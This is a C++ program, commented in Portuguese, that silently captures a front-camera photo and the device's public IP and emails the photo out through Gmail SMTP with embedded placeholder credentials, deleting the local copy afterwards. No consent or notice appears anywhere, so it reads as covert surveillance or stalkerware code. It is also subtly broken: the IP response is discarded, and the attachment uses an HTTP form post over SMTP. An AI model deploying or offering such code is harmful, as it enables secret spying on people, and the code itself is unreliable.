#include <iostream>
#include <string>
#include <curl/curl.h>
#include <opencv2/opencv.hpp>

using namespace std;
using namespace cv;

size_t write_callback(char *ptr, size_t size, size_t nmemb, void *userdata) {
    return size * nmemb;
}

int main(int argc, char** argv) {
    // Configurar informações do e-mail
    string from = "seuemail@gmail.com";
    string password = "suasenha";
    string to = "destinatario@gmail.com";
    string subject = "Assunto do E-mail";
    string body = "Corpo do E-mail";

    // Capturar a localização do dispositivo
    CURL *curl;
    CURLcode res;
    curl = curl_easy_init();
    string location;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://api.ipify.org");
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &location);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }

    // Capturar a foto da câmera frontal
    VideoCapture cap(0, CAP_V4L2);
    if (!cap.isOpened()) {
        cerr << "Erro ao acessar a câmera." << endl;
        return -1;
    }
    cap.set(CAP_PROP_FOURCC, CV_FOURCC('M', 'J', 'P', 'G'));
    cap.set(CAP_PROP_FRAME_WIDTH, 640);
    cap.set(CAP_PROP_FRAME_HEIGHT, 480);
    Mat frame;
    cap.read(frame);

    // Enviar a foto capturada por e-mail
    string filename = "foto.jpg";
    imwrite(filename, frame);
    curl = curl_easy_init();
    if (curl) {
        struct curl_slist *recipients = NULL;
        string upload_url = "smtps://smtp.gmail.com:465";
        string upload_userpass = from + ":" + password;
        string upload_payload = "Subject: " + subject + "\r\n"
                                "To: " + to + "\r\n"
                                "\r\n"
                                + body + "\r\n";
        curl_easy_setopt(curl, CURLOPT_URL, upload_url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERPWD, upload_userpass.c_str());
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from.c_str());
        recipients = curl_slist_append(recipients, to.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
        struct curl_httppost *formpost = NULL;
        struct curl_httppost *lastptr = NULL;
        curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "file",
                     CURLFORM_FILE, filename.c_str(), CURLFORM_END);
        curl_easy_setopt(curl, CURLOPT_HTTPPOST, formpost);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        curl_formfree(formpost);
        curl_slist_free_all(recipients);
    }
    remove(filename.c_str());
    return 0;
}
